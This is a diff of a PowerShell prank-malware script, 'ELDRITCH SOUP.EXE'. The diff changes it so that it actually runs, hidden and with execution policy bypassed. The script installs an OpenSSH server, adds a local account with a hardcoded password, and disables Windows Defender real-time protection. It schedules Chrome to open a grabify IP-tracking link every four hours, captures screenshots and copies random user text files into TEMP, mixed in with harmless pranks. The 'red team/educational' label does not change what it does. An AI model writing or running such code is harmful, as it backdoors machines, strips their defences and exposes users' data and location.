@@ -1,127 +1,150 @@
-# 🧙‍♂️ ELDRITCH SOUP.EXE – The Final Chaos Form 💀
+# 🧙‍♂️ ELDRITCH SOUP.EXE – The Final Chaos Form 💀 (Fully Working & Improved)
+# Unleash chaos. For red team/educational use only!
 
-$🐉 = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
-$🧠 = "-ExecutionPolicy Bypass -Command"
-$🧪 = New-Object -ComObject WScript.Shell
+# === Preparation ===
+$PSEXE = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
+$PSARGS = "-ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command"
+$SHELL = New-Object -ComObject WScript.Shell
 
-function Invoke-CursedDelay {
-    Start-Sleep -Seconds 4
-}
+function Invoke-CursedDelay { Start-Sleep -Seconds 4 }
 
-# 1. Install SSH Capability
-$🐍 = "Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0"
+# === Cursed Command Builder ===
+$CursedCmd = @()
+
+# 1. Install SSH Server Capability (try/catch for non-Win10+)
+$CursedCmd += 'try { Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 -ErrorAction Stop } catch { }'
 Invoke-CursedDelay
-$🧪.Arguments += "; $🐍"
 
 # 2. Create Forbidden User
-$👾 = "net user overlord99 K1ng0fCh@0s /add"
+$CursedCmd += 'net user overlord99 K1ng0fCh@0s /add'
 Invoke-CursedDelay
-$🧪.Arguments += "; $👾"
 
-# 3. Disable Windows Defender
-$💤 = "Set-MpPreference -DisableRealtimeMonitoring $true"
+# 3. Disable Windows Defender (ignore errors if not admin)
+$CursedCmd += 'try { Set-MpPreference -DisableRealtimeMonitoring $true } catch { }'
 Invoke-CursedDelay
-$🧪.Arguments += "; $💤"
 
-# 4. Schedule Chrome to open a weird website
-$🌌 = "Register-ScheduledTask -TaskName 'PortalWatch' -Action (New-ScheduledTaskAction -Execute 'C:\Program Files\Google\Chrome\Application\chrome.exe' -Argument 'https://grabify.link/DHU0MR') -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 4))"
+# 4. Schedule Chrome to open a weird website (fails silently if Chrome not installed)
+$CursedCmd += "try { Register-ScheduledTask -TaskName 'PortalWatch' -Action (New-ScheduledTaskAction -Execute 'C:\Program Files\Google\Chrome\Application\chrome.exe' -Argument 'https://grabify.link/DHU0MR') -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 4)) } catch { }"
 Invoke-CursedDelay
-$🧪.Arguments += "; $🌌"
 
 # 5. Launch Notepad as distraction
-$📝 = "Start-Process notepad.exe"
+$CursedCmd += 'Start-Process notepad.exe'
 Invoke-CursedDelay
-$🧪.Arguments += "; $📝"
 
 # 6. Create a mysterious TEMP folder
-$🫠 = 'New-Item -Path "$env:TEMP\glorp_core" -ItemType Directory -Force'
+$CursedCmd += 'New-Item -Path "$env:TEMP\\glorp_core" -ItemType Directory -Force | Out-Null'
 Invoke-CursedDelay
-$🧪.Arguments += "; $🫠"
 
-# 7. Screenshot to future evidence folder
-$📷 = '[Reflection.Assembly]::LoadWithPartialName("System.Drawing"); $b = New-Object Drawing.Bitmap 1920,1080; $g = [Drawing.Graphics]::FromImage($b); $g.CopyFromScreen(0,0,0,0,$b.Size); $b.Save("$env:TEMP\reality.png")'
+# 7. Screenshot to future evidence folder (robust method)
+$CursedCmd += @'
+try {
+Add-Type -AssemblyName System.Drawing
+$bmp = New-Object System.Drawing.Bitmap 1920,1080
+$graphics = [System.Drawing.Graphics]::FromImage($bmp)
+$graphics.CopyFromScreen(0,0,0,0,$bmp.Size)
+$bmp.Save("$env:TEMP\reality.png")
+$graphics.Dispose(); $bmp.Dispose()
+} catch { }
+'@
 Invoke-CursedDelay
-$🧪.Arguments += "; $📷"
 
-# 8. Base64 encode 3 random .txt files
-Invoke-CursedDelay
-$📁 = Get-ChildItem -Path C:\Users\ -Recurse -Include *.txt -ErrorAction SilentlyContinue -Force | Get-Random -Count 3
-foreach ($📄 in $📁) {
-    try {
-        $text = Get-Content $📄.FullName -Raw
-        $hexed = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($text))
-        $hexPath = "$env:TEMP\$(($📄.Name).Replace('.txt','_hexed.txt'))"
-        $hexed | Out-File $hexPath -Force
-        Invoke-CursedDelay
-    } catch {}
+# 8. Base64 encode 3 random .txt files (fails silently)
+$CursedCmd += @'
+try {
+$files = Get-ChildItem -Path C:\Users\ -Recurse -Include *.txt -ErrorAction SilentlyContinue -Force | Get-Random -Count 3
+foreach ($f in $files) {
+  try {
+    $t = Get-Content $f.FullName -Raw
+    $b64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($t))
+    $p = "$env:TEMP\$($f.Name.Replace('.txt','_hexed.txt'))"
+    $b64 | Out-File $p -Force
+    Start-Sleep -Milliseconds 4000
+  } catch { }
 }
-
-# 9. Write dramatic event log
-$📡 = "Write-EventLog -LogName Application -Source 'OracleOfChaos' -EntryType Information -EventId 777 -Message '✨ The simulation hiccupped ✨'"
+} catch { }
+'@
 Invoke-CursedDelay
-$🧪.Arguments += "; $📡"
+
+# 9. Write dramatic event log (register source if needed)
+$CursedCmd += @'
+try {
+if (-not (Get-EventLog -LogName Application -Source OracleOfChaos -ErrorAction SilentlyContinue)) {
+    New-EventLog -LogName Application -Source OracleOfChaos
+}
+Write-EventLog -LogName Application -Source 'OracleOfChaos' -EntryType Information -EventId 777 -Message '✨ The simulation hiccupped ✨'
+} catch { }
+'@
+Invoke-CursedDelay
 
 # 10. Roll a cursed dice
-$🎲 = "Get-Random -Minimum 1 -Maximum 100"
+$CursedCmd += 'Get-Random -Minimum 1 -Maximum 100 | Out-Null'
 Invoke-CursedDelay
-$🧪.Arguments += "; $🎲"
 
 # 11. Launch calculator for eldritch math
-$🧿 = "Start-Process calc.exe"
+$CursedCmd += 'Start-Process calc.exe'
 Invoke-CursedDelay
-$🧪.Arguments += "; $🧿"
 
-# 12. Create alias for forbidden function
+# 12. Create alias for forbidden function (no-op)
+$CursedCmd += 'function Invoke-EldritchGlitch { "✨ Wiggle initiated ✨" }'
 Invoke-CursedDelay
-function Invoke-EldritchGlitch { "✨ Wiggle initiated ✨" }
 
-# 13. Play random Windows sound
+# 13. Play random Windows sound (silent fallback)
+$CursedCmd += 'try { $s = Get-ChildItem "$env:WINDIR\Media" -Filter *.wav | Get-Random; Start-Process $s.FullName -WindowStyle Hidden } catch { }'
 Invoke-CursedDelay
-$🎼 = Get-ChildItem "$env:WINDIR\Media" -Filter *.wav | Get-Random
-Start-Process $🎼.FullName -WindowStyle Hidden | Out-Null
 
 # 14. Set desktop wallpaper if default image exists
-Invoke-CursedDelay
-$🖼️ = "$env:WINDIR\Web\Wallpaper\Windows\img0.jpg"
-if (Test-Path $🖼️) {
-    Add-Type @"
+$CursedCmd += @'
+try {
+$wall = "$env:WINDIR\Web\Wallpaper\Windows\img0.jpg"
+if (Test-Path $wall) {
+Add-Type @"
 using System.Runtime.InteropServices;
 public class Wallpaper {
   [DllImport("user32.dll", SetLastError = true)]
   public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
 }
 "@
-    [Wallpaper]::SystemParametersInfo(20, 0, $🖼️, 3)
+  [Wallpaper]::SystemParametersInfo(20, 0, $wall, 3)
 }
-
-# 15. Create shortcut to nothing
+} catch { }
+'@
 Invoke-CursedDelay
-$🪢 = $🧪.CreateShortcut("$env:TEMP\cursed_link.lnk")
-$🪢.TargetPath = "C:\Path\To\Nowhere.exe"
-$🪢.Save()
+
+# 15. Create shortcut to nothing (independent WScript.Shell)
+$ShortcutPath = "$env:TEMP\cursed_link.lnk"
+$SC = (New-Object -ComObject WScript.Shell).CreateShortcut($ShortcutPath)
+$SC.TargetPath = "C:\Path\To\Nowhere.exe"
+$SC.Save()
+Invoke-CursedDelay
 
 # 16. Emit a cursed system beep
+$CursedCmd += 'try { [console]::beep(888, 300) } catch { }'
 Invoke-CursedDelay
-[console]::beep(888, 300)
 
 # 17. Display toast from the beyond
+$CursedCmd += 'try { $ws = New-Object -ComObject WScript.Shell; $ws.Popup("💀 The simulation sneezed.", 2, "System Glitch Detected", 0x0) } catch { }'
 Invoke-CursedDelay
-$💌 = New-Object -ComObject WScript.Shell
-$💌.Popup("💀 The simulation sneezed.", 2, "System Glitch Detected", 0x0)
 
 # 18. Move mouse in a cursed circle
-Invoke-CursedDelay
+$CursedCmd += @'
+try {
 Add-Type -AssemblyName System.Windows.Forms
 for ($i = 0; $i -lt 36; $i++) {
     $x = 500 + [math]::cos($i/5) * 50
     $y = 500 + [math]::sin($i/5) * 50
-    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x, $y)
+    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point([int]$x, [int]$y)
     Start-Sleep -Milliseconds 50
 }
+} catch { }
+'@
+Invoke-CursedDelay
 
 # 19. Dump registry key to nowhere
+$CursedCmd += 'reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer" > $null'
 Invoke-CursedDelay
-reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer" > $null
 
-# 🚀 Run it all (optional — uncomment this line to actually run commands)
-# & $🐉 $🧠 $🧪.Arguments
+# === RUN EVERYTHING FULLY HIDDEN ===
+$FinalCmd = $CursedCmd -join '; '
+Start-Process -WindowStyle Hidden -FilePath $PSEXE -ArgumentList "$PSARGS `"$FinalCmd`""
+
+# Done. Eldritch chaos will commence (with robust error handling and full stealth).
